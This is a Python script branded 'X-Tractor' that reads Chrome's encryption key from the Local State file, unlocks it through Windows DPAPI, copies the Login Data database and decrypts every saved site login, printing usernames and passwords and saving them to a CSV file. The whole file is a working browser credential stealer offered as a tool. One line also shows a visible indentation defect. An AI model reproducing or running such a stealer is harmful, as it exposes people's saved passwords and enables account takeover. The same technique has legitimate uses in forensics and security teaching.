import os
import json
import base64
import sqlite3
import win32crypt
import pandas as pd
from Crypto.Cipher import AES
import shutil
from pyfiglet import Figlet
from termcolor import colored
from datetime import datetime, timedelta

def spt_name():
    print("=" * 100)
    print("=" * 100)
    spt_nm = Figlet(font="banner3-D")
    print(colored(spt_nm.renderText('X-Tractor'), 'red'))
    print("=" * 100)
    print("=" * 100)

def get_chrome_datetime(chromedate):
    """Return a `datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        # print(iv)
        password = password[15:]
        # print(password)
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # print("Cipher Text: ", cipher)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return print("Not Supported")

def main():
    spt_name()
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    # Edge : "USERPROFILE", "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # print("Copied location is: ", db_path)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    ou = []
    au = []
    un = []
    ps = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username and password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
            ou.append(origin_url)
            au.append(action_url)
            un.append(username)
            ps.append(password)
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("=" * 80)

    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
    data = {'Origin URL': ou, 'Action URL': au, 'Username': un, 'Password': ps}
    df = pd.DataFrame(data)
    df.to_csv('Password_chrome.csv')
    print("Password is stored in 'Password_chrome.csv' file.")

if __name__ == "__main__":
    main()
